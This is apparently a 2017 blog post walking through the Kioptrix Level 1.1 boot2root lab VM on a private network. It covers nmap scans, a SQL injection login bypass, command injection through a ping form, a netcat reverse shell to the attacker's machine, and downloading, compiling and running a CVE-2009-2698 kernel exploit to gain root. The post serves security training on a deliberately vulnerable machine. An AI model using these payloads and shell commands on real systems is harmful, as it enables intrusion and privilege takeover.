---
layout: post
title:  "Kioptrix: Level 1.1 (#2)"
date:   2017-03-11
summary: Kioptrix Level 1.1 (#2) walkthrough
---

### Setup
Download and unzip the vm, then mount the .vmdk file as storage in your vm config and setup your network settings. Note that this vm should auto detect using DHCP.

Virtualbox:  
Because the vm was made in vmware and I'm using virtual box there was an error on boot up "kernel panic". To resolve this the following was changed:

{% highlight python %}
Storage - removed SATA controller, added HD under IDE controller
Network - adapter type changed to PCnet-PCI II
Unticked audio and usb
{% endhighlight %}

# Kioptrix: Level 1.1 (#2)
To start we need to find the host on the network, to do this I used nmap to do a ping scan on the subnet:

{% highlight python %}
nmap -sn 192.168.56.0-255

Nmap scan report for 192.168.56.102
Host is up (-0.10s latency).
{% endhighlight %}

## Information gathering
Now we know the IP of the host we can use port scanning to see what services are running. With nmap we can also do some banner grabbing, version checking, OS detection and enumeration of services:

{% highlight python %}
nmap -sS -sV -O 192.168.56.102

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 3.9p1 (protocol 1.99)
80/tcp   open  http       Apache httpd 2.0.52 ((CentOS))
111/tcp  open  rpcbind    2 (RPC #100000)
443/tcp  open  ssl/https?
631/tcp  open  ipp        CUPS 1.1
3306/tcp open  mysql      MySQL (unauthorized)
MAC Address: 08:00:27:A0:BB:8F (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Network Distance: 1 hop
{% endhighlight %}

The results show a few interesting services, (22)SSH, (80)HTTP, (631)CUPS and (3306)MySQL.

## Enumeration
Focusing on these services we want to enumerate them for further information eg versions, user names and vulnerabilities.

<b>Apache httpd 2.0.52 ((CentOS))</b>  
Has a few vulnerabilities but it looks like RCE requires a bunch of specific config to be present. The server also hosts a web app with a login page.

<https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-66/version_id-15944/Apache-Http-Server-2.0.52.html>

<b>CUPS 1.1</b>  
Looks like this might be vulnerable to CVE-2004-1267 a remote buffer overflow <https://www.exploit-db.com/exploits/24977/> the others found relate to DOS attacks. This might only affect version 1.1.22

## Web app
Navigating to the web app shows a login page, the server is also running MySQL so we will test for SQLi.

	 username = test
	 password = 1'or'1'='1

![login][image1]

The classic SQLi test gives us access to the app.

![command][image2]

From here it looks like an admin web console that allows us to ping machines on the network, this looks like its just running commands and could allow command injection. We can try adding special characters to inject a second command eg `|` or `;`

![results][image3]

Looks like command injection works and we can run commands as the apache user, what we want to do is get access as root or into the database to escalate our privilege.

## Privilege escalation
Because we now have access to the server as the apache user we can dump passwords or try to find a way to escalate our privilege to root via a vulnerability. 

From the nmap scan we did OS detection and only found Linux 2.6.X/Linux 2.6.9 - 2.6.30 this is a bit of a gap but now we have access to a user account we can get the exact version running.

{% highlight python %}
localhost|uname -a

Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
{% endhighlight %}

A quick search comes back with CVE-2009-2698 privilege escalation <https://www.exploit-db.com/exploits/9542/> 

### Remote shell
We should be able to transfer it over, compile and execute it. A quick check to see if we can get a remote shell to make things easier:

{% highlight python %}
localhost; whereis nc
{% endhighlight %}

The response shows it has nc installed at /usr/local/bin/nc we can now try a reverse shell using ncat.

{% highlight python %}
# Set listener on our machine
nc -lvp 8080

# Web command injection for remote nc shell
localhost; /usr/local/bin/nc -e /bin/sh 192.168.56.101 8080
{% endhighlight %}

Now we have a remote shell we can download the file, compile and execute it. First we download the exploit from <https://www.exploit-db.com/exploits/9542/> and run a python command to serve the file.

{% highlight python %}
# Python to serve file
python -m SimpleHTTPServer

# Now on our target reverse shell
# Get the file
cd /tmp
wget http://192.168.56.101/9542.c

# Compile it
gcc 9542.c -o exploit

# Execute it
./exploit
whoami
root
{% endhighlight %}

## Conclusion
Another straight forward boot2root vm. Web app contains SQL injection and command injection gives us access to apache user account which we use to get a remote shell. The OS is vulnerable to privilege escalation CVE-2009-2698 which we leverage to get root.

[image1]:../assets/images/kioptrix-level-1-1-2/login.png
[image2]:../assets/images/kioptrix-level-1-1-2/command.png
[image3]:../assets/images/kioptrix-level-1-1-2/results.png